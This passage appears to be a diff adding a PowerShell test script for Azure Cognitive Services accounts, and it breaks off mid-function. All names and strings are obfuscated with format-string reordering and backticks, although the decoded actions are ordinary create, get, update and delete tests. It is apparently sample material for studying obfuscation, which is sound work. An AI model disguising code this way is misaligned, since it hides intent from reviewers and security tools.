@@ -1,0 +1,780 @@
+  $45lXi= [TYPe]("{1}{16}{4}{13}{14}{15}{8}{2}{12}{0}{11}{6}{7}{5}{10}{9}{3}"-f'Co','MicrOSoFT.a','AGEmeN','sEt','R','iCeS.','itI','vesErV','.MAn','.PSnetwoRKRulE','MoDEls','GN','t.','E.C','o','mmands','Zu')  ; 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function TE`S`T-`NEWazurE`RmCo`G`N`I`TivEs`e`RvicesA`CcouNT
+{
+    
+    ${r`gNaME} = &("{7}{10}{0}{8}{6}{9}{5}{2}{3}{1}{11}{4}"-f 'ogniti','urceN','entTestRe','so','e','m','vicesMa','Ge','veSer','nage','t-C','am');
+
+    try
+    {
+        
+        ${acC`ou`Ntn`Ame} = 'csa' + ${R`gnamE};
+        ${Sk`U`NAmE} = 'S2';
+        ${a`c`C`OUnttYpe} = ("{2}{3}{1}{0}" -f's','ic','T','extAnalyt');
+        ${l`OC} = &("{1}{0}{2}"-f'ca','Get-Lo','tion') -providerNamespace ("{4}{1}{3}{2}{7}{6}{0}{5}"-f 'e','ro','ft.C','so','Mic','s','vic','ognitiveSer') -resourceType ("{0}{2}{1}" -f'a','s','ccount') -preferredLocation ("{0}{1}" -f'West',' US');
+
+        &("{1}{2}{0}{3}{4}" -f 'eGr','New-AzRes','ourc','o','up') -Name ${rgN`A`Me} -Location ${l`oC};
+
+        ${CR`eATe`dACCOu`Nt} = &("{1}{3}{4}{6}{2}{0}{5}"-f 'ccou','New-AzCogniti','sA','v','eSer','nt','vice') -ResourceGroupName ${rgn`AmE} -Name ${A`cc`OUNtn`AMe} -Type ${aC`cOuNt`TYpE} -SkuName ${Sk`U`Name} -Location ${L`oc};
+        &("{1}{2}{4}{0}{3}" -f 'l','Asser','t','l','-NotNu') ${cr`eATEdAC`c`OUnT};
+        
+        ${Cr`e`ATEdAcCOUn`TA`gAiN} = &("{1}{7}{4}{8}{2}{5}{3}{0}{6}"-f'Acc','N','r','ices','niti','v','ount','ew-AzCog','veSe') -ResourceGroupName ${R`gnAMe} -Name ${A`ccoU`NtN`AMe} -Type ${Acc`ouNT`T`ypE} -SkuName ${s`kunA`ME} -Location ${L`oC} -Force;
+        &("{2}{0}{1}" -f'er','t-NotNull','Ass') ${cREAt`EDA`CcO`Un`T`AGAIn}
+        &("{2}{1}{3}{0}{4}" -f 'rt-AreEq','s','As','e','ual') ${cr`eATE`D`ACCOUNT}."Na`me" ${c`ReaT`Ed`A`ccoun`TagAin}."N`AME";
+        &("{3}{0}{2}{1}" -f'sert-AreEq','l','ua','As') ${CRE`AtEDA`cCOUNt}."EnDp`OInt" ${CREaT`EdA`cCOu`NtAg`Ain}."EN`D`PoINt";
+        
+        &("{4}{0}{3}{2}{1}"-f 'y-I','ion','cept','fEx','Retr') { &("{2}{3}{8}{1}{4}{9}{6}{7}{5}{0}" -f't','ve-AzC','Re','m','ognitiv','n','rvic','esAccou','o','eSe') -ResourceGroupName ${rgNA`ME} -Name ${aCCo`Un`TNaMe} -Force; }
+    }
+    finally
+    {
+        
+        &("{2}{1}{0}{3}"-f 'c','an-Resour','Cle','eGroup') ${R`gnA`mE}
+    }
+}
+
+
+function Te`St-newAz`Ure`RmcOGN`i`Ti`VEsERvIceSAcC`OuNtiNVal`IDnaME
+{
+    
+    ${rGNA`ME} = &("{3}{7}{2}{6}{8}{10}{14}{0}{11}{5}{13}{12}{9}{1}{4}"-f'eme','Na','nit','Ge','me','Res','i','t-Cog','v','ce','eServic','ntTest','ur','o','esManag');
+
+    try
+    {
+        
+        ${aC`Cou`NtN`Ame} = 'csa' + ${R`G`NamE} + ("{1}{2}{0}"-f'id','.i','nval');
+        ${sKuNA`Me} = 'S2';
+        ${ACC`oUn`TtYpE} = ("{2}{0}{1}"-f'yti','cs','TextAnal');
+        ${l`oc} = &("{1}{0}{3}{2}" -f'et-L','G','ation','oc') -providerNamespace ("{1}{6}{2}{7}{0}{3}{5}{4}" -f't.','Mi','ros','Cogni','s','tiveService','c','of') -resourceType ("{1}{2}{0}" -f 'ts','acco','un') -preferredLocation ("{0}{1}"-f 'W','est US');
+
+        &("{1}{4}{3}{0}{2}"-f 'urc','New-','eGroup','so','AzRe') -Name ${r`GnA`ME} -Location ${L`oc};
+
+		&("{4}{3}{2}{1}{0}"-f'ins','ta','sCon','rt-Throw','Asse') { &("{4}{5}{7}{3}{6}{2}{0}{1}" -f 'cou','nt','sAc','rv','New-AzCog','ni','ice','tiveSe') -ResourceGroupName ${r`GnAmE} -Name ${aCC`OUNt`N`AMe} -Type ${A`CCoU`NTT`ypE} -SkuName ${SK`UNAmE} -Location ${L`oC};
+        &("{0}{3}{1}{2}" -f 'Assert','tNu','ll','-No') ${CRe`AT`eDAc`COUnT}; } ("{8}{5}{4}{6}{3}{0}{7}{2}{1}{10}{9}"-f 'e S','e','ic','v',' create',' to',' Cogniti','erv','Failed',' account.','s')
+        
+        &("{3}{1}{0}{2}" -f 'ry','t','-IfException','Re') { &("{7}{5}{3}{2}{6}{4}{1}{0}{8}" -f 'cesAccou','rvi','i','AzCogn','veSe','e-','ti','Remov','nt') -ResourceGroupName ${r`gn`Ame} -Name ${acco`U`NTna`Me} -Force; }
+    }
+    finally
+    {
+        
+        &("{3}{0}{5}{1}{2}{4}"-f'an','s','our','Cle','ceGroup','-Re') ${r`gna`me}
+    }
+}
+
+
+function t`es`T-nEWAzur`ErmALLkiNds`oFc`Og`NITIve`seRV`I`C`EsaCCou`N`Ts
+{
+	
+    ${r`gN`AMe} = &("{5}{10}{1}{9}{6}{3}{2}{0}{7}{8}{4}{11}" -f'nageme','CognitiveSe','esMa','ic','stResou','G','v','ntT','e','r','et-','rceName');
+
+	${lOc`wU} = &("{0}{1}{3}{2}"-f 'Get-','Loca','ion','t') -providerNamespace ("{4}{1}{2}{3}{0}"-f'ices','.','Cogn','itiveServ','Microsoft') -resourceType ("{0}{1}" -f'acco','unts') -preferredLocation ("{0}{1}"-f 'West',' US');
+	${LOc`GBl} = &("{2}{3}{0}{1}"-f '-Loca','tion','Ge','t') -providerNamespace ("{5}{3}{0}{4}{1}{2}" -f 'ognitiveS','vice','s','.C','er','Microsoft') -resourceType ("{2}{0}{1}"-f 'o','unts','acc') -preferredLocation ("{1}{0}"-f'al','Glob');
+
+	try
+	{
+		&("{3}{2}{0}{1}"-f 'ource','Group','zRes','New-A') -Name ${rgN`AME} -Location ("{0}{1}{2}"-f'W','es','t US');
+		
+		
+		&("{2}{4}{3}{9}{0}{6}{5}{1}{7}{8}" -f'tiv','vices','Tes','ateCo','t-Cre','er','eS','Acc','ount','gni') ${RgNA`ME} ("{3}{2}{1}{0}" -f't','chTes','ingSear','B') ("{2}{0}{1}" -f 'ng.S','earch.v7','Bi') 'S1' ${L`oCg`Bl}
+		&("{4}{1}{0}{2}{6}{9}{5}{8}{7}{3}"-f't','a','eCo','count','Test-Cre','Serv','gnitiv','cesAc','i','e') ${RG`Na`mE} ("{2}{1}{3}{0}"-f 'hTest','gSpe','Bin','ec') ("{2}{3}{1}{0}{4}"-f'chSe','e','S','pe','rvices') 'S0' ${l`OCwu}
+		&("{9}{3}{0}{1}{7}{2}{8}{6}{4}{5}"-f 'eate','Co','itiveSer','Cr','ou','nt','sAcc','gn','vice','Test-') ${rgn`Ame} ("{1}{0}{5}{4}{3}{2}"-f'in','B','Test','ck','pellChe','gS') ("{0}{1}{3}{2}" -f 'Bing.SpellCh','e','7','ck.v') 'S1' ${Lo`CGbL}
+		&("{3}{8}{2}{4}{6}{1}{5}{7}{9}{0}"-f'count','og','st-','T','C','ni','reateC','tiveSer','e','vicesAc') ${R`G`NAMe} ("{1}{3}{0}{4}{2}"-f 'u','Com','onTest','p','terVisi') ("{0}{1}{2}"-f 'ComputerV','i','sion') 'S0' ${LOc`wu}
+		&("{4}{3}{5}{2}{6}{0}{8}{7}{1}"-f'eCog','icesAccount','a','t-C','Tes','re','t','eServ','nitiv') ${rgN`Ame} ("{0}{2}{3}{1}"-f'Conten','orTest','t','Moderat') ("{1}{3}{0}{2}"-f'oderat','Cont','or','entM') 'S0' ${L`o`cwu}
+		&("{1}{8}{0}{5}{2}{4}{7}{6}{3}{9}{10}"-f 'ea','Test','eCo','A','gnitiveServi','t','s','ce','-Cr','ccoun','t') ${rg`N`AME} ("{0}{1}{2}" -f'Face','Tes','t') ("{0}{1}"-f'Fa','ce') 'S0' ${lO`CWU}
+		&("{1}{6}{5}{0}{8}{2}{3}{7}{4}" -f 'C','Tes','itiveServicesA','c','unt','te','t-Crea','co','ogn') ${rGnA`ME} ("{2}{1}{0}" -f't','s','LUISTe') ("{0}{1}" -f 'LUI','S') 'S0' ${Loc`Wu}
+		&("{2}{3}{5}{0}{6}{4}{1}{7}" -f 'CreateCognitiveSe','ic','T','est','v','-','r','esAccount') ${R`gNa`ME} ("{3}{1}{0}{4}{2}"-f'ognitio','akerRec','t','Spe','nTes') ("{0}{4}{2}{3}{1}{5}" -f'Speak','t','rRec','ogni','e','ion') 'S0' ${lo`CWU}
+		&("{1}{6}{5}{9}{0}{7}{2}{3}{4}{8}"-f'g','Test-','cesAcc','ou','n','reateC','C','nitiveServi','t','o') ${Rg`NaME} ("{0}{2}{3}{1}" -f'TextAnalyti','st','c','sTe') ("{0}{2}{1}{3}" -f'Text','yti','Anal','cs') 'S1' ${lOc`WU}
+		&("{3}{1}{7}{5}{0}{4}{2}{6}{8}{9}"-f'e','eate','rvic','Test-Cr','Se','itiv','e','Cogn','sA','ccount') ${RGNA`ME} ("{2}{0}{1}{3}" -f'x','tTran','Te','slationTest') ("{0}{4}{3}{1}{2}" -f'TextT','a','tion','sl','ran') 'S1' ${l`Oc`GbL}
+	}
+	finally
+	{
+	    
+        &("{3}{1}{0}{2}{4}"-f 'n','lea','-R','C','esourceGroup') ${rg`NaMe}
+	}
+}
+
+
+function Te`S`T-`REMoVEazUr`E`R`mcOG`NIt`iVe`serVIcE`saccOUnt
+{
+    
+    ${R`gNA`mE} = &("{7}{0}{3}{13}{11}{4}{10}{8}{12}{1}{6}{9}{5}{2}" -f 'et','na','ourceName','-C','nit','tRes','ge','G','M','mentTes','iveServices','g','a','o');
+
+    try
+    {
+        
+        ${ac`C`oUnTN`Ame} = 'csa' + ${RGn`A`ME};
+        ${SKu`NA`ME} = 'S1';
+        ${A`c`COUn`TTyPe} = ("{2}{1}{0}{3}"-f'na','xtA','Te','lytics');
+        ${L`Oc} = &("{1}{0}{2}" -f'-','Get','Location') -providerNamespace ("{5}{4}{0}{2}{1}{3}"-f'.Cog','S','nitive','ervices','osoft','Micr') -resourceType ("{2}{1}{0}"-f 'ts','coun','ac') -preferredLocation ("{0}{1}{2}" -f 'We','st',' US');
+
+        &("{0}{4}{3}{1}{2}" -f'Ne','eso','urceGroup','R','w-Az') -Name ${Rg`Na`ME} -Location ${L`Oc};
+
+        ${C`ReatedACc`ouNT} = &("{2}{0}{3}{4}{5}{1}" -f'ew-Az','ccount','N','Co','gnitiveService','sA') -ResourceGroupName ${RGNA`mE} -Name ${A`cc`OuNTNaME} -Type ${AcCou`NT`T`YpE} -SkuName ${sk`Un`Ame} -Location ${l`Oc} -Force;
+        &("{5}{0}{8}{4}{9}{2}{6}{3}{1}{7}"-f'o','vicesAccoun','og','Ser','Az','Rem','nitive','t','ve-','C') -ResourceGroupName ${rg`NaMe} -Name ${ACCo`UN`TNAMe} -Force;
+		&("{3}{0}{1}{2}"-f '-T','h','rows','Assert') { ${aC`cO`UntGottEN} = &("{3}{1}{0}{4}{2}{6}{5}" -f'eSer','AzCognitiv','ice','Get-','v','unt','sAcco') -ResourceGroupName ${R`gNa`mE} -Name ${ac`CO`UNtN`AMe}; }
+		&("{3}{2}{0}{1}"-f'-N','ull','ert','Ass') ${a`cCOUN`TGo`TTEn};	
+        &("{0}{3}{2}{1}{4}" -f'R','xceptio','y-IfE','etr','n') { &("{0}{4}{1}{3}{6}{5}{2}" -f 'Re','ive','t','Serv','move-AzCognit','esAccoun','ic') -ResourceGroupName ${rGnA`ME} -Name ${A`ccou`NTnAmE} -Force; }
+    }
+    finally
+    {
+        
+        &("{3}{2}{4}{0}{5}{1}" -f'Res','roup','le','C','an-','ourceG') ${R`GNAme}
+    }
+}
+
+
+function T`e`sT-GeTazU`ReCo`GniTi`VE`servi`C`ea`CcOU`Nt
+{
+    
+    ${rG`Na`Me} = &("{7}{2}{8}{5}{9}{4}{0}{6}{3}{1}"-f 'cesManagemen','rceName','t-Cogn','tResou','eServi','t','tTes','Ge','i','iv');
+
+    try
+    {
+        
+        ${AccOu`NtNA`Me} = 'csa' + ${RgN`A`mE};
+        ${sK`U`NAmE} = 'S2';
+        ${acC`ountT`y`Pe} = ("{1}{0}{2}" -f 'c','TextAnalyti','s');
+        ${L`Oc} = &("{2}{0}{1}{3}"-f't','-Locati','Ge','on') -providerNamespace ("{4}{2}{1}{5}{3}{0}" -f 'iveServices','roso','c','gnit','Mi','ft.Co') -resourceType ("{2}{0}{1}" -f'cc','ounts','a') -preferredLocation ("{2}{1}{0}"-f ' US','est','W');
+
+        &("{5}{0}{3}{1}{4}{2}"-f '-AzR','rceGr','up','esou','o','New') -Name ${r`G`NamE} -Location ${L`oc};
+
+        &("{6}{4}{2}{0}{1}{3}{5}"-f'esAc','c','AzCognitiveServic','o','w-','unt','Ne') -ResourceGroupName ${r`gName} -Name ${a`CCouN`TNA`Me} -Type ${AC`coUnT`TY`pe} -SkuName ${s`kUN`AMe} -Location ${L`Oc} -Force;
+
+        ${aC`coU`Nt} = &("{2}{5}{9}{3}{4}{0}{8}{6}{1}{7}"-f'veSer','o','Get-Az','t','i','Cog','icesAcc','unt','v','ni') -ResourceGroupName ${r`GnAme} -Name ${ACC`ou`NTnAmE};
+        
+        &("{2}{1}{0}{3}" -f'a','t-AreEqu','Asser','l') ${accO`Untn`Ame} ${a`CcoU`Nt}."AcC`Ou`Ntn`AmE";
+        &("{4}{1}{2}{0}{3}"-f 'AreEqua','s','ert-','l','As') ${aCCo`Unt`TYPE} ${A`cC`oUNT}."acco`UnTT`yPe";
+        &("{0}{1}{2}{3}" -f 'A','s','sert-Ar','eEqual') ${l`Oc} ${acCOU`NT}."loc`AT`iOn";
+        &("{2}{0}{1}"-f 'eEq','ual','Assert-Ar') ${sKUn`A`mE} ${AcC`O`UnT}."s`kU"."NA`me";
+
+        ${aC`COUn`Ts} = &("{2}{4}{0}{5}{1}{3}"-f'AzCogni','iveSer','Get','vicesAccount','-','t') -ResourceGroupName ${r`gNa`Me};
+        ${NumBEROfaccoU`Nt`s`iNrG} = (${a`Cc`ounTs} | &("{0}{1}" -f 'meas','ure'))."COU`NT";
+        &("{1}{0}{2}"-f'reEqua','Assert-A','l') ${ACC`Ou`NTN`AmE} ${acc`OUn`Ts}[0]."aCcoun`Tn`A`me";
+        &("{4}{1}{2}{0}{3}" -f 'E','-Ar','e','qual','Assert') ${A`C`CO`UnttyPe} ${AC`CouNts}[0]."acC`O`UnTTY`PE";
+        &("{0}{1}{3}{2}"-f 'As','ser','al','t-AreEqu') ${l`OC} ${acCou`N`Ts}[0]."L`Oca`TiOn";
+        &("{3}{0}{1}{4}{2}"-f'er','t','reEqual','Ass','-A') ${s`k`UnaME} ${AC`cO`UNts}[0]."s`ku"."Na`me";
+
+        ${AlL`ACcoUNt`SiN`SUBscRI`P`T`i`ON} = &("{7}{4}{2}{1}{3}{6}{8}{9}{0}{5}"-f 'Accou','gni','zCo','tiveS','-A','nt','e','Get','r','vices');
+        ${NU`mb`eRo`FaCcOUN`TSiNSUBsCrI`pt`ION} = (${A`l`lAccOUNT`si`NSuB`ScRIP`TiOn} | &("{1}{0}" -f'ure','meas'))."CoU`Nt";
+
+        &("{1}{0}{2}"-f'u','Assert-Tr','e') { ${NuMB`ER`O`FAc`cou`NtSINsUbSCRIP`TiOn} -ge ${Nu`MbeR`oFACCoUntS`IN`RG} }
+        
+        &("{2}{1}{4}{3}{0}" -f 'ion','e','R','ry-IfExcept','t') { &("{6}{3}{0}{2}{4}{1}{5}"-f 'Cognit','sAc','iveSer','-Az','vice','count','Remove') -ResourceGroupName ${r`gnAMe} -Name ${acC`OU`Ntname} -Force; }
+    }
+    finally
+    {
+        
+        &("{4}{2}{3}{0}{5}{1}"-f'n-Reso','roup','le','a','C','urceG') ${Rgna`mE}
+    }
+}
+
+
+function t`esT-`sETa`zu`RerM`coGnITIvESerVicesaC`COU`NT
+{
+    
+    ${r`gnaMe} = &("{13}{8}{7}{5}{2}{12}{3}{0}{9}{4}{11}{6}{10}{1}{14}" -f 'i','tResource','itiv','v','geme','gn','tTe','o','-C','cesMana','s','n','eSer','Get','Name');
+
+    try
+    {
+        
+        ${aCCO`UN`TnA`ME} = 'csa' + ${RGN`A`me};
+        ${sK`U`NAmE} = 'S2';
+        ${A`ccO`UN`TTyPe} = ("{3}{2}{0}{1}" -f'Analyt','ics','t','Tex');
+        ${l`OC} = &("{2}{1}{0}{3}"-f'i','-Locat','Get','on') -providerNamespace ("{4}{3}{0}{1}{2}"-f 'crosoft.Cogn','itiveS','ervices','i','M') -resourceType ("{0}{1}"-f 'ac','counts') -preferredLocation ("{1}{0}"-f 't US','Wes');
+        
+        &("{1}{5}{0}{2}{3}{4}"-f 'Reso','New-','urce','G','roup','Az') -Name ${RgN`AMe} -Location ${L`Oc};
+        &("{6}{7}{3}{5}{4}{1}{0}{2}"-f'sAcco','vice','unt','o','tiveSer','gni','New-','AzC') -ResourceGroupName ${rG`N`AME} -Name ${acC`O`UN`TNamE} -Type ${A`C`cOuNTty`pe} -SkuName ${S`kUNAmE} -Location ${l`Oc} -Force;
+
+        ${oRIG`INaLAc`CoU`Nt} = &("{6}{7}{5}{3}{1}{8}{0}{4}{2}" -f'Acco','e','nt','vic','u','iveSer','Ge','t-AzCognit','s') -ResourceGroupName ${r`GN`Ame} -Name ${ACc`oU`N`TNAME};
+
+        
+        ${CHANGeda`c`COU`Nt} = &("{4}{2}{0}{1}{5}{3}"-f 'Cognitiv','eServic','Az','unt','Set-','esAcco') -ResourceGroupName ${R`GN`Ame} -Name ${accO`Un`T`NAMe} -SkuName ('S3') -Tags @{("{1}{0}" -f 'ame','N') = ("{2}{1}{0}"-f'ag','t','test'); ("{1}{0}" -f'ue','Val') = ("{0}{2}{1}" -f 't','val','est')} -Force;
+        
+        &("{1}{0}{2}"-f't-A','Asser','reEqual') ${OrI`GInA`L`AC`COUNT}."l`oC`ATiOn" ${CHA`Ng`E`DAccoUNT}."l`oCati`ON";
+        &("{1}{2}{3}{0}" -f'l','Assert-','AreEq','ua') ${ori`G`InalaC`coUnT}."E`NdpoI`NT" ${Ch`A`NgeDa`CCoU`Nt}."ENd`p`OiNT";
+        &("{3}{1}{0}{4}{2}" -f 'ert','ss','Equal','A','-Are') ${orI`gina`l`A`cCoUnT}."kI`ND" ${cHA`Nge`dAC`co`Unt}."K`InD";
+        
+        
+        ${g`oTtEnaCco`Unt} = &("{1}{2}{0}{3}{4}" -f 'ervice','G','et-AzCognitiveS','sAcco','unt') -ResourceGroupName ${Rgna`Me} -Name ${acCoU`Ntn`A`me};
+
+        &("{0}{3}{2}{1}" -f'A','Equal','sert-Are','s') ${ORI`gi`NA`LacCO`UNT}."Loca`T`ioN" ${goTtE`NA`C`counT}."l`OcA`TiON";
+        &("{2}{3}{1}{0}"-f 'qual','-AreE','Ass','ert') ${ORIGIN`Al`A`CcOUnT}."e`NDpO`int" ${GOt`TEnACCOu`Nt}."EnDPo`INt";
+        &("{3}{1}{2}{4}{0}" -f 'Equal','sert','-A','As','re') ${or`IgIN`Al`ACcoUnT}."kI`ND" ${gO`TTena`cco`Unt}."K`iNd";
+        &("{2}{1}{4}{0}{3}" -f 'reEqu','s','A','al','sert-A') 'S3' ${goTteNac`c`Ou`NT}."s`ku"."N`AMe";
+		
+        &("{1}{0}{3}{2}" -f 'ce','Retry-IfEx','on','pti') { &("{1}{8}{0}{6}{3}{5}{7}{4}{2}{9}" -f 'Cog','Remov','cc','itive','icesA','Se','n','rv','e-Az','ount') -ResourceGroupName ${r`Gna`mE} -Name ${a`CCOuN`TnAMe} -Force; }
+    }
+    finally
+    {
+        
+        &("{4}{1}{2}{0}{3}"-f 'sourceGrou','n-','Re','p','Clea') ${R`GNA`Me}
+    }
+}
+
+
+function Test-`GETAZUR`erMcoGn`iTiV`E`seRvicesA`CcO`UntkeY
+{
+    
+    ${r`gName} = &("{6}{11}{5}{10}{0}{1}{2}{4}{7}{3}{9}{8}"-f 'ervice','sManagem','e','rc','ntTe','t','Get-Cog','stResou','ame','eN','iveS','ni');
+
+    try
+    {
+        
+        ${aCcoU`NTna`Me} = 'csa' + ${r`g`NAmE};
+        ${SKu`N`Ame} = 'S2';
+        ${A`c`CO`UnTType} = ("{0}{4}{1}{2}{3}" -f 'Te','tAn','al','ytics','x');
+        ${l`Oc} = &("{0}{2}{1}" -f'Get-L','n','ocatio') -providerNamespace ("{0}{3}{4}{2}{5}{1}" -f'Microso','ervices','v','ft.Cog','niti','eS') -resourceType ("{1}{2}{0}"-f 's','acco','unt') -preferredLocation ("{0}{2}{1}"-f'West ','S','U');
+
+        &("{5}{1}{4}{0}{2}{3}"-f's','w','ourc','eGroup','-AzRe','Ne') -Name ${r`GnAmE} -Location ${L`OC};
+        &("{2}{6}{1}{5}{4}{7}{8}{0}{3}" -f 'sAcco','Cognitive','Ne','unt','rvi','Se','w-Az','c','e') -ResourceGroupName ${R`GnA`me} -Name ${Acc`OUn`T`NAMe} -Type ${AccOU`NTT`YPe} -SkuName ${SKU`N`Ame} -Location ${L`oC} -Force;
+        
+        ${ke`YS} = &("{7}{4}{8}{2}{1}{0}{3}{5}{6}"-f 'esAcc','vic','er','ou','ve','n','tKey','Get-AzCogniti','S') -ResourceGroupName ${rgNa`me} -Name ${A`CcO`UnTNa`Me};
+        
+        &("{0}{1}{2}{3}"-f 'A','sser','t-AreNotEqu','al') ${ke`yS}."KE`y1" ${k`eYS}."K`Ey2";
+
+        &("{3}{0}{1}{2}"-f'y-','IfExcepti','on','Retr') { &("{1}{4}{3}{6}{5}{0}{7}{2}" -f 'vic','Remov','ount','g','e-AzCo','er','nitiveS','esAcc') -ResourceGroupName ${r`GNAME} -Name ${A`cCoUn`TnA`Me} -Force; }
+    }
+    finally
+    {
+        
+        &("{2}{1}{0}{3}"-f 'n-ResourceGrou','a','Cle','p') ${rGnA`ME}
+    }
+}
+
+
+function Te`St-NewaZuReRmC`O`g`N`itIvESe`RVI`CesaCC`oUNTkEy
+{
+    
+    ${r`gna`ME} = &("{11}{6}{4}{2}{5}{0}{12}{8}{10}{3}{7}{9}{1}{14}{13}"-f'S','estReso','i','eme','t-Cognit','ve','e','nt','esMa','T','nag','G','ervic','rceName','u');
+    
+    try
+    {
+        
+        ${ACcou`NTNA`me} = 'csa' + ${RGN`A`me};
+        ${SK`UName} = 'S2';
+        ${aC`c`OUNTTY`pe} = ("{1}{0}{2}"-f'tAnaly','Tex','tics');
+        ${l`OC} = &("{0}{3}{1}{2}" -f'G','-','Location','et') -providerNamespace ("{3}{5}{6}{4}{2}{1}{0}" -f'es','ognitiveServic','C','Micr','.','o','soft') -resourceType ("{2}{1}{0}"-f'nts','u','acco') -preferredLocation ("{2}{1}{0}" -f 'US',' ','West');
+
+        &("{0}{3}{1}{2}" -f'New-','sourceG','roup','AzRe') -Name ${R`Gna`ME} -Location ${L`oC};
+        &("{8}{4}{2}{0}{9}{1}{5}{6}{7}{3}" -f'o','tiveSe','AzC','count','-','rvic','e','sAc','New','gni') -ResourceGroupName ${Rg`N`AME} -Name ${aC`counTna`me} -Type ${ACcO`U`NttY`PE} -SkuName ${S`Ku`NAmE} -Location ${l`Oc} -Force;
+        
+        ${O`RI`gIna`lK`eYS} = &("{1}{0}{2}{6}{7}{5}{3}{4}"-f'Az','Get-','Co','sAcco','untKey','ice','gniti','veServ') -ResourceGroupName ${r`gn`AME} -Name ${aCco`U`N`TNAMe};
+        
+        ${upDa`T`edkEYS} = &("{7}{0}{3}{9}{6}{5}{8}{1}{2}{4}"-f 'w','i','cesAccou','-AzCog','ntKey','v','iti','Ne','eServ','n') -ResourceGroupName ${r`GN`AME} -Name ${a`cc`OUNtNAmE} -KeyName ("{0}{1}"-f 'Key','1') -Force;
+            
+        &("{0}{3}{1}{2}" -f'Asser','eNotEq','ual','t-Ar') ${o`RIgin`A`Lke`ys}."k`eY1" ${upd`ATeDk`eyS}."k`eY1";
+        &("{0}{2}{4}{3}{1}" -f 'A','qual','ssert-','eE','Ar') ${oriGI`Na`lKEYS}."KE`Y2" ${u`PdATE`dk`Eys}."K`EY2";
+
+        
+        ${r`EUpd`AT`EdkeyS} = &("{5}{0}{1}{2}{3}{4}" -f'w-AzC','o','gniti','veServicesAcco','untKey','Ne') -ResourceGroupName ${RGna`Me} -Name ${ac`coUNTN`AME} -KeyName ("{0}{1}"-f 'Key','2') -Force;
+
+        &("{2}{0}{4}{3}{1}" -f'rt-A','l','Asse','qua','reE') ${uPD`ATe`DkeYs}."k`eY1" ${RE`U`pd`AT`edKEys}."K`EY1";
+        &("{0}{2}{3}{1}"-f 'Ass','l','ert-Ar','eNotEqua') ${Or`Ig`iNALk`eYS}."Ke`Y2" ${R`E`Up`DATe`dkEYS}."ke`Y2";
+
+        &("{0}{1}{2}{3}" -f 'Ret','ry-IfExcepti','o','n') { &("{1}{6}{5}{0}{3}{2}{4}" -f'n','Re','tiv','i','eServicesAccount','g','move-AzCo') -ResourceGroupName ${rG`N`Ame} -Name ${ac`COu`N`TnaMe} -Force; }
+    }
+    finally
+    {
+        
+        &("{3}{4}{2}{0}{1}{5}" -f 'eG','rou','esourc','Clean','-R','p') ${R`gNAme}
+    }
+}
+
+
+
+function t`es`T-`NE`w`AZur`ErmCog`Ni`T`iVEsE`RViCEsaccOunT`WIt`HCUStom`d`oMAIN
+{
+    
+    ${R`Gn`AME} = &("{6}{0}{7}{2}{4}{5}{1}{3}" -f 'et-Cognit','esourc','rvicesManageme','eName','n','tTestR','G','iveSe');
+
+    try
+    {
+        
+        ${acCOu`NtN`A`mE} = 'csa' + ${R`gNA`me};
+        ${S`Ku`NAme} = 'S2';
+        ${acc`ouN`TtyPE} = ("{2}{0}{1}" -f'e','xtAnalytics','T');
+        ${L`oc} = &("{1}{2}{0}{3}" -f't-','G','e','Location') -providerNamespace ("{2}{1}{4}{5}{3}{0}"-f'rvices','crosoft.Cog','Mi','eSe','nit','iv') -resourceType ("{1}{2}{0}"-f'ounts','ac','c') -preferredLocation ("{0}{3}{1}{4}{2}" -f 'We','Central','S','st ',' U');
+
+        &("{4}{0}{2}{3}{1}"-f 'w-','up','AzR','esourceGro','Ne') -Name ${rgna`ME} -Location ${L`oC};
+
+        ${cr`EA`T`EDA`CcouNt} = &("{6}{5}{0}{1}{2}{7}{4}{3}"-f 'ognitiveS','e','rvice','t','un','-AzC','New','sAcco') -ResourceGroupName ${RgNA`Me} -Name ${aCc`OUNT`NaME} -Type ${Ac`CO`Unt`TYPE} -SkuName ${S`ku`NaME} -Location ${l`oC} -CustomSubdomainName ${Ac`c`o`UntNaMe} -Force;
+        &("{3}{2}{1}{0}" -f'Null','t','t-No','Asser') ${cR`eaTEda`c`c`oUnt};
+        
+        ${c`Re`ATE`dAccO`UNtaGAIN} = &("{2}{1}{3}{0}{4}" -f 'ognitiveServi','-','New','AzC','cesAccount') -ResourceGroupName ${RG`NAME} -Name ${aCc`oU`NTNA`ME} -Type ${acCoUn`T`Ty`pE} -SkuName ${S`KU`NaMe} -Location ${l`OC} -CustomSubdomainName ${a`ccOu`N`TName} -Force;
+        &("{1}{0}{3}{2}" -f'sert-','As','ll','NotNu') ${cRea`TEdA`CCo`UnTaGa`IN}
+        &("{2}{1}{3}{0}" -f 'Equal','ert-A','Ass','re') ${CReAT`ed`ACcoU`NT}."Na`Me" ${cr`eaTeDacCoUntA`G`AIn}."N`AmE";
+        &("{4}{3}{2}{1}{0}"-f 'reEqual','A','-','ssert','A') ${CreAtE`Dacco`Unt}."eNDP`oINT" ${Crea`TeDac`CO`UntAG`Ain}."EN`dPO`iNT";
+        &("{0}{2}{1}" -f'Ass','rue','ert-T') {${CReat`EDACC`oU`NT}."En`d`pOiNt".("{0}{2}{1}" -f'C','ains','ont').Invoke(("{4}{1}{3}{2}{5}{0}" -f 'zure.com','n','veservi','iti','cog','ces.a'))}
+        &("{3}{4}{2}{1}{0}"-f 'eption','c','Ex','R','etry-If') { &("{5}{6}{3}{1}{7}{2}{0}{4}"-f'sAcco','e','rvice','nitiv','unt','R','emove-AzCog','Se') -ResourceGroupName ${R`G`NAME} -Name ${AcCOU`NT`N`AmE} -Force; }
+    }
+    finally
+    {
+        
+        &("{3}{4}{1}{2}{0}"-f'p','rceGro','u','Clean-Res','ou') ${R`gN`Ame}
+    }
+}
+
+
+function TEsT`-NEWaz`U`RE`RM`COG`NIt`IVe`ser`VICesAc`COunT`W`IthvNet
+{
+    
+    ${R`G`NaMe} = &("{11}{0}{5}{9}{10}{4}{7}{2}{6}{12}{3}{8}{13}{1}" -f 'Cogni','me','t','eso','icesM','t','Tes','anagemen','urce','iveSer','v','Get-','tR','Na');
+
+    try
+    {
+        
+        ${A`c`CountN`AMe} = 'csa' + ${r`GN`AmE};
+        ${vnETnA`me} = ("{0}{1}"-f 'vn','et') + ${r`gna`Me};
+        ${SKUN`A`ME} = 'S2';
+        ${Ac`c`ouNTtyPe} = ("{1}{2}{3}{0}" -f'cs','Tex','tAn','alyti');
